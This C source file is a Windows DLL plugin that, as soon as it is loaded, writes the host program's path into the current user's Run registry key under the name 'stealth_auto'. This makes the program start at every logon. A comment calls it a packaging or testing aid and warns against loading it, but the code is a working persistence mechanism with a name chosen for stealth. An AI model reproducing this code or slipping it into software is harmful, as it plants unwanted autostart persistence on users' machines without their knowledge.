// persist_registry.c - plugin that creates a HKCU Run key
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // WARNING: This plugin creates a Run key. Do NOT load this plugin on your host
        // unless you intend to install persistence. Intended for packaging/testing only.
        HKEY hKey;
        char exePath[MAX_PATH];
        if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) break;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            // Create a simple run entry named "stealth_auto"
            RegSetValueExA(hKey, "stealth_auto", 0, REG_SZ, (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
            RegCloseKey(hKey);
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
